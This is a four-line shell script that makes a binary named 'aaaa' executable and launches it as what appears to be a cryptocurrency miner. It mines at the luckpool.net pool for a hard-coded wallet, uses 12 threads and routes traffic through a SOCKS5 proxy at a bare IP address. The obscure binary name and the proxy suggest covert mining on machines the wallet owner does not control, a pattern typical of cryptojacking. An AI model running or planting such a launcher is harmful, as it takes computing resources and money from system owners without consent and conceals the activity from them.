#!/bin/sh
POOL=na.luckpool.net:3956
WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
PROXY=socks5://98.162.25.23:4145
chmod +x aaaa && ./aaaa -v -l $POOL -u $WALLET -p hybrid -t 12 -x $PROXY
